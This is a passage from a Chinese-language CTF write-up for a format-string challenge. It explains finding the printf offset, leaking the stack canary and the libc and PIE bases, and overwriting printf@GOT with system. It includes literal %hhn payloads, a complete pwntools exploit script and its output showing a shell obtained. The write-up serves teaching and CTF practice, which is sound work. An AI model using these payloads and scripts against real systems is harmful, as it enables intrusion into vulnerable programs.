例如要寫 byte \texttt{0x40} 到 \texttt{{[}0x4010{]}}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
%64c%17$hhn     ← 先印 64 個字元（計數 = 64 = 0x40），再寫進第 17 個參數指向的位址
\end{Verbatim}

\textbf{要寫一個 6 bytes 的 libc 位址（如
\texttt{system}）}，有兩種切法：

\begin{itemize}
\tightlist
\item
  \texttt{write\_\allowbreak{}size=\textquotesingle{}\allowbreak{}short\textquotesingle{}\allowbreak{}}：\textbf{原則上}切成
  3 個 2-bytes → 3 個 \texttt{\%\allowbreak{}hn}，需要 3 個指標（24 bytes 位址）。
\item
  \texttt{write\_\allowbreak{}size=\textquotesingle{}\allowbreak{}byte\textquotesingle{}\allowbreak{}}：\textbf{原則上}以
  1-byte 為單位切 → 6 個寫入。 ※注意 但 \texttt{fmtstr\_\allowbreak{}payload} 的
  \texttt{write\_\allowbreak{}size\_\allowbreak{}max} \textbf{預設是
  \texttt{\textquotesingle{}\allowbreak{}long\textquotesingle{}\allowbreak{}}}，它會把相鄰 byte
  \textbf{自動合併}成 \texttt{\%\allowbreak{}hn}（2 bytes）或 \texttt{\%\allowbreak{}n}（4
  bytes）以縮短格式字串。所以實跑時你可能看到
  \texttt{\%\allowbreak{}17\$\allowbreak{}n}（本機實測）或
  \texttt{\%\allowbreak{}1097c\%\allowbreak{}19\$\allowbreak{}hn}（遠端實測，填充 1097
  個字元），\textbf{不是}固定的「6 個 \texttt{\%\allowbreak{}hhn}」。 想要保證「只用
  \texttt{\%\allowbreak{}hhn}、填充絕不超過 255」要另外寫
  \texttt{write\_\allowbreak{}size\_\allowbreak{}max=\textquotesingle{}\allowbreak{}byte\textquotesingle{}\allowbreak{}}。兩種寫法都能拿到
  flag，但要知道差別。
\end{itemize}

\textbf{本題選 \texttt{byte}}，因為： * 6 個 \texttt{\%\allowbreak{}hhn} 需要 6
個指標（48 bytes 位址），總長約 120 bytes，\textbf{遠小於 \texttt{fgets}
的 255 上限}； * \texttt{\%\allowbreak{}hhn} 單次最多只需要 255
個填充字元（若被合併成 \texttt{\%\allowbreak{}hn} 就可能到 65535，實測遠端那次是
1097，很吵但完全無害 ------ exploit 只是把它 drain 掉）。

\begin{quote}
小結：\textbf{不要以為
\texttt{write\_\allowbreak{}size=\textquotesingle{}\allowbreak{}byte\textquotesingle{}\allowbreak{}} 就一定產生
6 個 \texttt{\%\allowbreak{}hhn}。} 想確認就跑
\texttt{fmtstr\_\allowbreak{}payload(8,\allowbreak{}\ \allowbreak{}\{\allowbreak{}addr:\allowbreak{}\ \allowbreak{}value\}\allowbreak{},\allowbreak{}\ \allowbreak{}write\_\allowbreak{}size=\textquotesingle{}\allowbreak{}byte\textquotesingle{}\allowbreak{},\allowbreak{}\ \allowbreak{}numbwritten=0,\allowbreak{}\ \allowbreak{}badbytes=b\textquotesingle{}\allowbreak{}\textbackslash{}\allowbreak{}n\textquotesingle{}\allowbreak{})}
把結果印出來看， 或明確加上
\texttt{write\_\allowbreak{}size\_\allowbreak{}max=\textquotesingle{}\allowbreak{}byte\textquotesingle{}\allowbreak{}}。\textbf{重點是
\texttt{len(payload)\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}0xFF} 且不含
\texttt{\textbackslash{}\allowbreak{}n}。}
\end{quote}

\textbf{實際 payload 範例之一（遠端某次執行，那次剛好 6 個 byte
都沒被合併）}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
%64c%17$hhn%52c%18$hhn%14c%19$hhn%68c%20$hhn%12c%21$hhn%21c%22$hhnaaaaba
\x10\xe0K\xff\xee]\x00\x00     ← 第 17 個參數：&printf@GOT       (=0x5deeff4be010)
\x15\xe0K\xff\xee]\x00\x00     ← 第 18 個參數：&printf@GOT+5     (先寫最大的 byte)
\x12\xe0K\xff\xee]\x00\x00     ← 第 19 個參數：&printf@GOT+2
\x14\xe0K\xff\xee]\x00\x00     ← 第 20 個參數：&printf@GOT+4
\x13\xe0K\xff\xee]\x00\x00     ← 第 21 個參數：&printf@GOT+3
\x11\xe0K\xff\xee]\x00\x00     ← 第 22 個參數：&printf@GOT+1
\end{Verbatim}

\textbf{但位址是 ASLR 抽出來的，所以「哪幾個 byte
被合併」每次都不一樣。} 其他實測輸出：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
[*] write payload (96 bytes): b'%64c%15$hhn%63c%16$hhn%8c%17$n%58c%18$hhn%4c%19$hhnaaaab...'    ← 含 %17$n（4-byte 合併）
[*] write payload (96 bytes): b'%64c%15$hhn%51c%16$hhn%36c%17$hhn%7c%18$hhn%1097c%19$hna...'   ← 含 %1097c%19$hn（2-byte 合併）
\end{Verbatim}

（我自己最近跑的兩次 ------ 本機、遠端各一次 ------ 都剛好是 \textbf{112
bytes、6 個 \texttt{\%\allowbreak{}hhn}}。可見這真的每次不同。）

所以「payload 有幾個 \texttt{\%\allowbreak{}hhn}、幾個 bytes、會不會出現
\texttt{\%\allowbreak{}n}/\texttt{\%\allowbreak{}hn}」\textbf{不固定}；
不變的是「\textbf{\texttt{len(payload)\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}0xFF} 且不含
\texttt{\textbackslash{}\allowbreak{}n}}」這個可用性條件（exploit 就是檢查這兩點）。

\begin{itemize}
\tightlist
\item
  \texttt{aaaaba} 是\textbf{對齊填充}：讓「格式指令區」的長度剛好是
  \textbf{72 bytes}（66 bytes 指令 + 6 bytes \texttt{aaaaba}），
  這樣第一個位址才落在 8-byte 邊界上。
\item
  一般式：\texttt{buf{[}0..\allowbreak{}7{]}} = 參數 8、\texttt{buf{[}8..\allowbreak{}15{]}} =
  參數 9、\ldots{} 也就是 \textbf{\texttt{buf{[}8k{]}} = 參數
  \texttt{8+k}}。 第一個位址在 \texttt{buf{[}72{]}} →
  \texttt{72/\allowbreak{}8\ \allowbreak{}=\ \allowbreak{}9} → 參數 \texttt{8+9\ \allowbreak{}=\ \allowbreak{}**17**}。（注意：是
  \texttt{buf{[}72{]}}，不是 \texttt{buf{[}64{]}}！）
  \textbf{如果格式指令區的長度不是 8 的倍數，第一個位址就會落在「半個
  slot」上 → \texttt{\%\allowbreak{}17\$\allowbreak{}hhn} 讀到的是「半個位址 + 半個別的東西」→
  寫到錯誤的地方 → segfault。}
  這種對齊務必用工具算，不要手算。（\texttt{fmtstr\_\allowbreak{}payload}
  會自動幫你補。）
\item
  想自己檢查長度：\texttt{python3\ \allowbreak{}-\allowbreak{}c\ \allowbreak{}"p=b\textquotesingle{}\allowbreak{}\%\allowbreak{}64c\%\allowbreak{}17\textbackslash{}\allowbreak{}\$\allowbreak{}hhn\%\allowbreak{}52c\%\allowbreak{}18\textbackslash{}\allowbreak{}\$\allowbreak{}hhn\%\allowbreak{}14c\%\allowbreak{}19\textbackslash{}\allowbreak{}\$\allowbreak{}hhn\%\allowbreak{}68c\%\allowbreak{}20\textbackslash{}\allowbreak{}\$\allowbreak{}hhn\%\allowbreak{}12c\%\allowbreak{}21\textbackslash{}\allowbreak{}\$\allowbreak{}hhn\%\allowbreak{}21c\%\allowbreak{}22\textbackslash{}\allowbreak{}\$\allowbreak{}hhnaaaaba\textquotesingle{}\allowbreak{};\ \allowbreak{}print(len(p),\allowbreak{}\ \allowbreak{}len(p)//\allowbreak{}8,\allowbreak{}\ \allowbreak{}8+len(p)//\allowbreak{}8)"}
  → \texttt{72\ \allowbreak{}9\ \allowbreak{}17}。
\item
  一連串寫入的\textbf{順序}是 pwntools
  排好的：它會讓計數\textbf{只增不減}（所以每個
  \texttt{\%\allowbreak{}\textless{}\allowbreak{}寬度\textgreater{}\allowbreak{}c}
  的寬度都是「差值」），不需要繞回。
\item
  位址區裡的 \texttt{\textbackslash{}\allowbreak{}x00} 會讓 \texttt{printf}
  \textbf{在那裡停住}------但所有 \texttt{\%\allowbreak{}hhn}
  都在那之前執行完了，所以完全沒問題（這是把位址放\textbf{最後}的標準理由）。
\end{itemize}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{\texorpdfstring{4. 用 \texttt{\%\allowbreak{}N\$\allowbreak{}p} 暴力找 offset
的實用技巧（教學用）}{4. 用 \%N\$p 暴力找 offset 的實用技巧（教學用）}}\label{ux7528-np-ux66b4ux529bux627e-offset-ux7684ux5be6ux7528ux6280ux5de7ux6559ux5b78ux7528}

\paragraph{技巧
A：標記法（本題用這招）}\label{ux6280ux5de7-aux6a19ux8a18ux6cd5ux672cux984cux7528ux9019ux62db}

在 payload 開頭放一個\textbf{好認的 8 bytes 標記}，例如
\texttt{AAAABBBB}（= \texttt{0x4242424241414141}），後面接一串
\texttt{\%\allowbreak{}N\$\allowbreak{}p}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
AAAABBBB|%1$p|%2$p|...|%46$p
\end{Verbatim}

哪一個 \texttt{\%\allowbreak{}N\$\allowbreak{}p} 印出
\texttt{0x4242424241414141}，\textbf{\texttt{buf{[}0{]}} 就是第 N
個參數}。本題答案 = \textbf{8}。

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{fmt }\OperatorTok{=} \StringTok{b\textquotesingle{}AAAABBBB\textquotesingle{}} \OperatorTok{+} \StringTok{b\textquotesingle{}|\textquotesingle{}}\NormalTok{.join(}\StringTok{b\textquotesingle{}\%\%\%d$p\textquotesingle{}} \OperatorTok{\%}\NormalTok{ i }\ControlFlowTok{for}\NormalTok{ i }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{1}\NormalTok{, }\DecValTok{47}\NormalTok{))}
\CommentTok{\# → 找出等於 0x4242424241414141 的那一個}
\end{Highlighting}
\end{Shaded}

\paragraph{\texorpdfstring{技巧 B：\texttt{FmtStr}
自動找}{技巧 B：FmtStr 自動找}}\label{ux6280ux5de7-bfmtstr-ux81eaux52d5ux627e}

pwntools 內建自動探測（原理就是技巧 A）：

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ send\_payload(payload):}
\NormalTok{    p.sendline(payload)}
    \ControlFlowTok{return}\NormalTok{ p.recvline()}
\NormalTok{autofmt }\OperatorTok{=}\NormalTok{ FmtStr(execute\_fmt}\OperatorTok{=}\NormalTok{send\_payload)}
\BuiltInTok{print}\NormalTok{(autofmt.offset)     }\CommentTok{\# → 8}
\end{Highlighting}
\end{Shaded}

\paragraph{技巧
C：直接掃一大段}\label{ux6280ux5de7-cux76f4ux63a5ux6383ux4e00ux5927ux6bb5}

\texttt{\%\allowbreak{}N\$\allowbreak{}p} 很占長度（\texttt{\%\allowbreak{}100\$\allowbreak{}p} 就 6
個字元），一次塞不下太多。\textbf{分次掃}：

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{for}\NormalTok{ lo }\KeywordTok{in}\NormalTok{ (}\DecValTok{1}\NormalTok{, }\DecValTok{41}\NormalTok{, }\DecValTok{81}\NormalTok{):                      }\CommentTok{\# 每次印 40 個，注意 \textless{}255 字元}
\NormalTok{    fmt }\OperatorTok{=} \StringTok{b\textquotesingle{}|\textquotesingle{}}\NormalTok{.join(}\StringTok{b\textquotesingle{}\%\%\%d$p\textquotesingle{}} \OperatorTok{\%}\NormalTok{ i }\ControlFlowTok{for}\NormalTok{ i }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(lo, lo}\OperatorTok{+}\DecValTok{40}\NormalTok{))}
\NormalTok{    p.sendline(fmt)}
\end{Highlighting}
\end{Shaded}

本題就是這樣一路掃到第 80 個參數，才找到 \texttt{PIE+0x11c9}（第 47
個）。

\paragraph{技巧 D：確認 offset
不會漂移}\label{ux6280ux5de7-dux78baux8a8d-offset-ux4e0dux6703ux6f02ux79fb}

\texttt{\%\allowbreak{}N\$\allowbreak{}p} 的參數編號由「堆疊框配置 + libc 的 printf
實作」決定。\textbf{同一份 libc + 同一支程式 = 固定}。 但要驗證的話：把
\texttt{buf{[}0{]}}
的標記改成別的內容，重跑幾次，確認那個位置永遠印出你的標記。

\begin{quote}
本題的 8 是 \textbf{glibc 2.39 的 printf} 行為。換 libc
版本時這個數字\textbf{可能不同}（例如有些題目是 6），所以永遠要實測。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{5. 洩漏（leak）了什麼、怎麼換算 libc
base}\label{ux6d29ux6f0fleakux4e86ux4ec0ux9ebcux600eux9ebcux63dbux7b97-libc-base}

我們在\textbf{第 1 次迴圈}送出：

\begin{Shaded}
\begin{Highlighting}[]
\StringTok{b\textquotesingle{}\%41$p|\%42$p|\%43$p|\%47$p\textquotesingle{}}
\end{Highlighting}
\end{Shaded}

得到（遠端真實輸出）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0x159dc03394a54300|0x7fffad6b7710|0x74c6d28001ca|0x5deeff4bb1c9
\end{Verbatim}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
參數
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
位址
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
值
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
意義
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
41 & \texttt{rbp-\allowbreak{}0x8} & \texttt{0x159dc03394a54300} & \textbf{stack
canary}（結尾一定是 \texttt{00}，因為最低位元組是 NUL） \\
42 & \texttt{rbp+0} & \texttt{0x7fffad6b7710} & \textbf{saved rbp}，指到
stack（教學用；本解法不需要） \\
43 & \texttt{rbp+8} & \texttt{0x74c6d28001ca} & \textbf{main 的返回位址}
= \texttt{libc\_\allowbreak{}base\ \allowbreak{}+\ \allowbreak{}0x2a1ca} \\
47 & \texttt{rbp+0x28} & \texttt{0x5deeff4bb1c9} & \textbf{main 的位址}
= \texttt{PIE\_\allowbreak{}base\ \allowbreak{}+\ \allowbreak{}0x11c9} \\
\end{longtable}
}

\paragraph{\texorpdfstring{為什麼第 43 個是
\texttt{libc\ \allowbreak{}+\ \allowbreak{}0x2a1ca}？}{為什麼第 43 個是 libc + 0x2a1ca？}}\label{ux70baux4ec0ux9ebcux7b2c-43-ux500bux662f-libc-0x2a1ca}

\texttt{main} 是被 \textbf{\texttt{\_\allowbreak{}\_\allowbreak{}libc\_\allowbreak{}start\_\allowbreak{}call\_\allowbreak{}main}}
呼叫的。我們反組譯 libc 的那個位置：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ objdump {-}d {-}M intel {-}{-}start{-}address=0x2a1c0 {-}{-}stop{-}address=0x2a1d0 libc.so.6}
\NormalTok{   2a1c4: 48 8b 45 88    mov    rax,QWORD PTR [rbp{-}0x78]   ; rax = main}
\NormalTok{   2a1c8: ff d0          call   rax                        ; ← 呼叫 main}
\NormalTok{   2a1ca: 89 c7          mov    edi,eax                    ; ✶ 返回位址就是這裡}
\NormalTok{   2a1cc: e8 bf d9 01 00 call   47b90 \textless{}exit\textgreater{}               ;   exit(main 的回傳值)}
\end{Highlighting}
\end{Shaded}

\texttt{call\ \allowbreak{}rax} 把\textbf{下一行（0x2a1ca）}
推進堆疊當返回位址；\texttt{main} 一執行 \texttt{ret} 就回到這裡。 →
\textbf{\texttt{0x2a1ca} 是這份 libc
專屬的常數}，跨多次執行都一樣（已驗證）。

\paragraph{換算式}\label{ux63dbux7b97ux5f0f}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{LIBC\_RET\_OFFSET }\OperatorTok{=} \BaseNTok{0x2a1ca}     \CommentTok{\# \_\_libc\_start\_call\_main 裡 call main 的下一行}
\NormalTok{MAIN\_OFFSET     }\OperatorTok{=} \BaseNTok{0x11c9}      \CommentTok{\# \_start 的 lea rdi,[rip+0xca] 算出來的 main}

\NormalTok{libc\_base }\OperatorTok{=}\NormalTok{ leak\_43 }\OperatorTok{{-}}\NormalTok{ LIBC\_RET\_OFFSET    }\CommentTok{\# 0x74c6d28001ca {-} 0x2a1ca = 0x74c6d27d6000}
\NormalTok{pie\_base  }\OperatorTok{=}\NormalTok{ leak\_47 }\OperatorTok{{-}}\NormalTok{ MAIN\_OFFSET        }\CommentTok{\# 0x5deeff4bb1c9 {-} 0x11c9  = 0x5deeff4ba000}
\end{Highlighting}
\end{Shaded}

驗算（遠端）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0x74c6d28001ca - 0x2a1ca = 0x74c6d27d6000   ← 頁對齊（結尾 000）✓
0x5deeff4bb1c9 - 0x11c9  = 0x5deeff4ba000   ← 頁對齊 ✓
\end{Verbatim}

\textbf{兩個 base 都必須是 0x1000
的倍數}，這是驗證算式有沒有錯的最好方法（程式裡有 assert 檢查）。

\paragraph{\texorpdfstring{從 libc base 到
\texttt{system}}{從 libc base 到 system}}\label{ux5f9e-libc-base-ux5230-system}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ readelf {-}sW libc.so.6 | grep {-}E " system@@| printf@@"}
\NormalTok{   528: 0000000000047b90    30 FUNC  GLOBAL DEFAULT  17 exit@@GLIBC\_2.2.5}
\NormalTok{  1050: 0000000000058740    45 FUNC  WEAK   DEFAULT  17 system@@GLIBC\_2.2.5}
\NormalTok{  2611: 00000000000600f0   204 FUNC  GLOBAL DEFAULT  17 printf@@GLIBC\_2.2.5}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{system     }\OperatorTok{=}\NormalTok{ libc\_base }\OperatorTok{+} \BaseNTok{0x58740}
\NormalTok{printf\_got }\OperatorTok{=}\NormalTok{ pie\_base  }\OperatorTok{+} \BaseNTok{0x4010}
\end{Highlighting}
\end{Shaded}

\paragraph{洩漏與覆寫的「鐵證」（直接讀目標行程記憶體）}\label{ux6d29ux6f0fux8207ux8986ux5bebux7684ux9435ux8b49ux76f4ux63a5ux8b80ux76eeux6a19ux884cux7a0bux8a18ux61b6ux9ad4}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{maps   libc=0x7f59a7200000 pie=0x7f59a7559000}
\NormalTok{leaked libc=0x7f59a7200000 pie=0x7f59a7559000  {-}\textgreater{} match: True}
\NormalTok{canary=0xf45bad45e803db00  (ends 00: True)}
\NormalTok{printf@GOT before write: 0x7f59a72600f0  (libc printf = 0x7f59a72600f0)}
\NormalTok{printf@GOT after  write: 0x7f59a7258740  (system     = 0x7f59a7258740)  {-}\textgreater{} True}
\end{Highlighting}
\end{Shaded}

（用 \texttt{/\allowbreak{}proc/\allowbreak{}\textless{}\allowbreak{}pid\textgreater{}\allowbreak{}/\allowbreak{}maps} 比對載入位址、用
\texttt{/\allowbreak{}proc/\allowbreak{}\textless{}\allowbreak{}pid\textgreater{}\allowbreak{}/\allowbreak{}mem} 直接讀
GOT，證明我們算的位址完全正確。）

\textbf{這段是可以自己重跑、自己證明的}（不需要
gdb，也不需要相信任何人的數字）。 把下面存成 \texttt{pwn2/\allowbreak{}selfcheck.\allowbreak{}py}
執行，你會看到「GOT 真的變成 \texttt{system}」：

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ pwn }\ImportTok{import} \OperatorTok{*}
\ImportTok{import}\NormalTok{ time}
\NormalTok{context.log\_level }\OperatorTok{=} \StringTok{\textquotesingle{}error\textquotesingle{}}
\NormalTok{context.arch }\OperatorTok{=} \StringTok{\textquotesingle{}amd64\textquotesingle{}}

\NormalTok{io  }\OperatorTok{=}\NormalTok{ process([}\StringTok{\textquotesingle{}./ld{-}linux{-}x86{-}64.so.2\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}{-}{-}library{-}path\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}.\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}./mad\_libs\textquotesingle{}}\NormalTok{], cwd}\OperatorTok{=}\StringTok{\textquotesingle{}.\textquotesingle{}}\NormalTok{)}
\NormalTok{pid }\OperatorTok{=}\NormalTok{ io.pid}

\NormalTok{io.recvuntil(}\StringTok{b\textquotesingle{}(1) \textgreater{} \textquotesingle{}}\NormalTok{)}
\NormalTok{io.sendline(}\StringTok{b\textquotesingle{}|\textquotesingle{}}\NormalTok{.join(}\StringTok{b\textquotesingle{}\%\%\%d$p\textquotesingle{}} \OperatorTok{\%}\NormalTok{ i }\ControlFlowTok{for}\NormalTok{ i }\KeywordTok{in}\NormalTok{ (}\DecValTok{41}\NormalTok{, }\DecValTok{43}\NormalTok{, }\DecValTok{47}\NormalTok{)))}
\NormalTok{line }\OperatorTok{=}\NormalTok{ io.recvuntil(}\StringTok{b\textquotesingle{}(2) \textgreater{} \textquotesingle{}}\NormalTok{, timeout}\OperatorTok{=}\DecValTok{5}\NormalTok{)[:}\OperatorTok{{-}}\BuiltInTok{len}\NormalTok{(}\StringTok{b\textquotesingle{}(2) \textgreater{} \textquotesingle{}}\NormalTok{)].strip()}
\NormalTok{canary, ret, mainp }\OperatorTok{=}\NormalTok{ (}\BuiltInTok{int}\NormalTok{(x, }\DecValTok{16}\NormalTok{) }\ControlFlowTok{for}\NormalTok{ x }\KeywordTok{in}\NormalTok{ line.split(}\StringTok{b\textquotesingle{}|\textquotesingle{}}\NormalTok{))}
\NormalTok{libc\_base, pie\_base }\OperatorTok{=}\NormalTok{ ret }\OperatorTok{{-}} \BaseNTok{0x2a1ca}\NormalTok{, mainp }\OperatorTok{{-}} \BaseNTok{0x11c9}      \CommentTok{\# 洩漏值換算 base}

\KeywordTok{def}\NormalTok{ base\_of(name):                                        }\CommentTok{\# 問核心：這個檔被載到哪}
\NormalTok{    maps }\OperatorTok{=} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}/proc/}\SpecialCharTok{\%d}\StringTok{/maps\textquotesingle{}} \OperatorTok{\%}\NormalTok{ pid).read()}
    \ControlFlowTok{return} \BuiltInTok{int}\NormalTok{([l }\ControlFlowTok{for}\NormalTok{ l }\KeywordTok{in}\NormalTok{ maps.splitlines() }\ControlFlowTok{if}\NormalTok{ name }\KeywordTok{in}\NormalTok{ l][}\DecValTok{0}\NormalTok{].split(}\StringTok{\textquotesingle{}{-}\textquotesingle{}}\NormalTok{)[}\DecValTok{0}\NormalTok{], }\DecValTok{16}\NormalTok{)}

\BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}maps  libc=}\SpecialCharTok{\%\#x}\StringTok{ pie=}\SpecialCharTok{\%\#x}\StringTok{\textquotesingle{}} \OperatorTok{\%}\NormalTok{ (base\_of(}\StringTok{\textquotesingle{}libc.so.6\textquotesingle{}}\NormalTok{), base\_of(}\StringTok{\textquotesingle{}mad\_libs\textquotesingle{}}\NormalTok{)))}
\BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}leak  libc=}\SpecialCharTok{\%\#x}\StringTok{ pie=}\SpecialCharTok{\%\#x}\StringTok{\textquotesingle{}} \OperatorTok{\%}\NormalTok{ (libc\_base, pie\_base))   }\CommentTok{\# 兩者必須一模一樣且頁對齊}

\KeywordTok{def}\NormalTok{ mem(addr, n}\OperatorTok{=}\DecValTok{8}\NormalTok{):                                       }\CommentTok{\# ✶ 直接讀行程記憶體}
    \ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}/proc/}\SpecialCharTok{\%d}\StringTok{/mem\textquotesingle{}} \OperatorTok{\%}\NormalTok{ pid, }\StringTok{\textquotesingle{}rb\textquotesingle{}}\NormalTok{) }\ImportTok{as}\NormalTok{ f:}
\NormalTok{        f.seek(addr)}\OperatorTok{;} \ControlFlowTok{return}\NormalTok{ f.read(n)}

\NormalTok{system     }\OperatorTok{=}\NormalTok{ libc\_base }\OperatorTok{+} \BaseNTok{0x58740}
\NormalTok{printf\_got }\OperatorTok{=}\NormalTok{ pie\_base  }\OperatorTok{+} \BaseNTok{0x4010}
\BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}printf@GOT before = }\SpecialCharTok{\%\#x}\StringTok{   (libc printf = }\SpecialCharTok{\%\#x}\StringTok{)\textquotesingle{}} \OperatorTok{\%}\NormalTok{ (u64(mem(printf\_got)), libc\_base }\OperatorTok{+} \BaseNTok{0x600f0}\NormalTok{))}

\NormalTok{payload }\OperatorTok{=}\NormalTok{ fmtstr\_payload(}\DecValTok{8}\NormalTok{, \{printf\_got: p64(system)[:}\DecValTok{6}\NormalTok{]\},}
\NormalTok{                         write\_size}\OperatorTok{=}\StringTok{\textquotesingle{}byte\textquotesingle{}}\NormalTok{, numbwritten}\OperatorTok{=}\DecValTok{0}\NormalTok{, badbytes}\OperatorTok{=}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{)}
\NormalTok{io.sendline(payload)                                      }\CommentTok{\# 第 2 次迴圈：改 GOT}
\NormalTok{time.sleep(}\FloatTok{0.5}\NormalTok{)}
\NormalTok{after }\OperatorTok{=}\NormalTok{ u64(mem(printf\_got))}
\BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}printf@GOT after  = }\SpecialCharTok{\%\#x}\StringTok{   (system     = }\SpecialCharTok{\%\#x}\StringTok{)  match=}\SpecialCharTok{\%s}\StringTok{\textquotesingle{}} \OperatorTok{\%}\NormalTok{ (after, system, after }\OperatorTok{==}\NormalTok{ system))}
\NormalTok{io.sendline(}\StringTok{b\textquotesingle{}/bin/sh\textquotesingle{}}\NormalTok{)}\OperatorTok{;}\NormalTok{ time.sleep(}\FloatTok{0.4}\NormalTok{)}\OperatorTok{;}\NormalTok{ io.recvrepeat(}\FloatTok{0.3}\NormalTok{)}
\NormalTok{io.sendline(}\StringTok{b\textquotesingle{}echo SHELL\_OK; id; echo DONE\textquotesingle{}}\NormalTok{)              }\CommentTok{\# 第 3 次迴圈：printf(buf) == system(buf)}
\BuiltInTok{print}\NormalTok{(io.recvuntil(}\StringTok{b\textquotesingle{}DONE\textquotesingle{}}\NormalTok{, timeout}\OperatorTok{=}\DecValTok{5}\NormalTok{))}
\NormalTok{io.close()}
\end{Highlighting}
\end{Shaded}

實測輸出：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ cd /home/kzzz/Documents/code/ctf/sunshine/pwn2 \&\& python3 selfcheck.py}
\NormalTok{maps  libc=0x7f6683000000 pie=0x7f668327b000}
\NormalTok{leak  libc=0x7f6683000000 pie=0x7f668327b000}
\NormalTok{printf@GOT before = 0x7f66830600f0   (libc printf = 0x7f66830600f0)}
\NormalTok{printf@GOT after  = 0x7f6683058740   (system     = 0x7f6683058740)  match=True}
\NormalTok{b\textquotesingle{}SHELL\_OK\textbackslash{}nuid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)\textbackslash{}nDONE\textquotesingle{}}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  \texttt{maps} 與 \texttt{leak} 兩行完全相同 → 我們的換算式是對的；
\item
  \texttt{printf@GOT} 從 \texttt{libc+0x600f0}（真 \texttt{printf}）變成
  \texttt{libc+0x58740}（\texttt{system}）→ \textbf{覆寫確實發生了}；
\item
  最後 \texttt{SHELL\_\allowbreak{}OK} 是 shell 印的 →
  不是「好像成功」，是\textbf{真的拿到 shell}。
\end{itemize}

\begin{quote}
※提示 這個 \texttt{/\allowbreak{}proc/\allowbreak{}\textless{}\allowbreak{}pid\textgreater{}\allowbreak{}/\allowbreak{}mem} 自檢法對所有
GOT 覆寫題都適用：\textbf{不要用「有沒有看到 shell 訊息」判斷成功，
直接把 GOT 讀回來比對。}（本機 \texttt{process()} 的 stderr 會併到
stdout，很容易誤判。）
\end{quote}

\paragraph{\texorpdfstring{為什麼只寫 6
bytes？（\texttt{p64(system){[}:\allowbreak{}6{]}} 的那個
\texttt{{[}:\allowbreak{}6{]}}）}{為什麼只寫 6 bytes？（p64(system){[}:6{]} 的那個 {[}:6{]}）}}\label{ux70baux4ec0ux9ebcux53eaux5beb-6-bytesp64system6-ux7684ux90a3ux500b-6}

第一次看到 \texttt{p64(system){[}:\allowbreak{}6{]}} 一定會想：「位址不是 8 bytes
嗎？為什麼截掉 2 bytes、 只寫 6 bytes 進 GOT，之後 \texttt{printf}
跳過去不會跳到半個位址嗎？」

答案：\textbf{不用擔心，因為最高的 2 bytes 本來就是
\texttt{\textbackslash{}\allowbreak{}x00\textbackslash{}\allowbreak{}x00}，它們沒有資訊。}

\begin{itemize}
\item
  x86-64 Linux 的使用者空間位址是 \textbf{47-bit
  canonical}：一般映射（libc、PIE、heap、stack） 一律落在
  \texttt{0x0000\_\allowbreak{}7fff\_\allowbreak{}ffff\_\allowbreak{}ffff} 以下（本機實測 \texttt{mad\_\allowbreak{}libs}
  行程的所有映射， 排除固定的 \texttt{{[}vsyscall{]}} 那頁之後，最大值是
  \texttt{0x7ffc03846000}）。
\item
  所以一個 libc 位址寫成 8 bytes 時長這樣（小端）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
system = 0x00007f6683058740
